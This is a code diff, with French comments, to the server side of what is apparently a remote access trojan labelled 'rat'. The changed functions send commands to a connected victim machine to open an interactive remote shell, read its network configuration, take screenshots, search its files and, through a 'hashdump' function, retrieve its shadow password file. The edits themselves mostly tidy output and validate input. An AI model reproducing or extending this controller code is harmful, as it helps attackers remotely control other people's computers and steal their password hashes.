@@ -20,7 +20,7 @@ def upload(client_socket):
 # Fonction permettant d'initier un shell intéractif sur le client
 def shell(client_socket, client_ip):
     client_socket.send(b'shell')  # Envoie de la commande
-    print("[*] Taper 'quit' pour quitter le Shell")
+    print("\n[*] Taper 'quit' pour quitter le Shell\n")
     while True:
         commande_shell = input(f"[{client_ip}] Shell > ")  # Récupération de la commande Shell saisie
         if commande_shell.lower() == 'quit':  # Gestion de la sortie du Shell
@@ -28,13 +28,13 @@ def shell(client_socket, client_ip):
             break
         client_socket.send(commande_shell.encode())  # Envoie de la commande Shell au client
         commande_shell_received = client_socket.recv(4096).decode()  # Récupération de la réponse de la commande Shell
-        print(commande_shell_received)  # Affichage de la réponse de la commande Shell
+        print(f'\n{commande_shell_received}')  # Affichage de la réponse de la commande Shell
 
 # Fonction permettant de récupérer la configuration réseau du client
 def ipconfig(client_socket):
     client_socket.send(b'ipconfig')  # Envoie de la commande
     conf_received = client_socket.recv(4096).decode()  # Récupération des données de la configuration
-    print(conf_received)  # Affichage de la configuration
+    print(f'\n{conf_received}')  # Affichage de la configuration
 
 # Fonction permettant de récupérer la capture d'écran du client
 def screenshot(client_socket, nb_screenshot):
@@ -52,10 +52,16 @@ def screenshot(client_socket, nb_screenshot):
 
 # Fonction permettant de chercher un fichier sur la machine du client
 def search(client_socket) :
-    recherche_to_send = input("[*] Entrer le nom du fichier rechercher : ") # Saisie du nom du fichier recherché
-    client_socket.send(f'search:{recherche_to_send}'.encode()) # Envoie de la commande avec le nom du fichier recherché
-    recherche_received = client_socket.recv(4096).decode() # Récupération des données de la recherche
-    print(recherche_received) # Affichage des résultats de la recherche
+    while True:
+        recherche_to_send = input("[*] Entrez le nom du fichier recherché : ") # Récupération du nom du fichier recherché
+        if recherche_to_send.strip() == "":
+            print("[!] Le nom du fichier ne peut pas être vide.")
+        else:
+            break
+    client_socket.send(b'search') # Envoie de la commande
+    client_socket.send(recherche_to_send.encode()) # Envoie du nom du fichier à rechercher
+    recherche_received = client_socket.recv(4096).decode() # Récupération des résultats de la recherche
+    print(f'\n{recherche_received}\n') # Affichage des résultats de la recherche
 
 # Fonction permettant de récupérer le fichier shadow du client
 def hashdump(client_socket):
@@ -92,7 +98,7 @@ def main():
 
         # Gestion des commandes envoyées au client
         while True:
-            command = input("rat > Taper votre commande ici : ")
+            command = input("rat > ")
             if command.lower() == 'help':
                 menu_help(client_socket)
             elif command.lower() == 'download':
